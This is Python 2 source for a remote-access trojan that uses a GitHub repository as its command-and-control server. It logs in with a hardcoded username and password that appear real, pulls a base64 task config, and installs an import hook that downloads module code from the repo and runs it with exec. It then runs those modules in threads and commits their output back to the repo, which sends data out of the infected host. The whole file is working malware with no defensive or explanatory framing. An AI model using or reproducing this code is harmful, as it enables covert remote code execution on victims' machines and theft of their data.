#!/usr/bin/python
import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login

github_name = "DingGY"
github_passwd = "q191316281"
github_project = "trojan"
github_branch = "master"

trojan_id = "adc"
trojan_config = "%s.json" % trojan_id
data_path = "data/%s/" % trojan_id
trojan_modules= []
configured = False
task_queue = Queue.Queue()
data_count = 0

def connect_github():
    gh = login(username=github_name, password=github_passwd)
    repo = gh.repository(github_name, github_project)
    branch = repo.branch(github_branch)

    return gh,repo,branch
def get_file_contents(filepath):
    gh,repo,branch = connect_github()
    tree = branch.commit.commit.tree.recurse()
    for filename in tree.tree:
        if filepath in filename.path:
            print "[*] Found file %s" % filepath
            blob = repo.blob(filename._json_data["sha"])
            return blob.content
    return None
def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True
    for task in config:
        if task['module'] not in sys.modules:
            exec "import %s" % task['module']
    return config

def store_module_result(data):
    global data_count
    gh,repo,branch = connect_github()
    data_count += 1
    remote_path = "data/%s/%d.data" % (trojan_id,data_count)
    #repo.create_file(remote_path,"Commit message",base64.b64encode(data))
    repo.create_file(remote_path,"Commit message",data)
    print "[*] stored file %s" % remote_path
    return


class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self,fullname,path=None):
        if configured:
            print "[*] Attempting to retrieve %s" % fullname
            new_library = get_file_contents("modules/%s" % fullname)
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self
        return None

    def load_module(self,name):
        module = imp.new_module(name)
        exec self.current_module_code in module.__dict__
        sys.modules[name] = module
        return module
def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    store_module_result(bytes(b"MODULE NAME: %s\nRESULT:\n%s\n" % (module,result)))
    task_queue.get()
    return

def main():
    sys.meta_path = [GitImporter()]
    while True:
        if task_queue.empty():
            config = get_trojan_config()
            for task in config:
                t = threading.Thread(target=module_runner,args=(task['module'],))
                t.start()
                '''must have delay to make sure the store running succeed'''
                time.sleep(10)
        time.sleep(10)
    return
__name__ = "__main__"

if __name__ == "__main__":
    main()




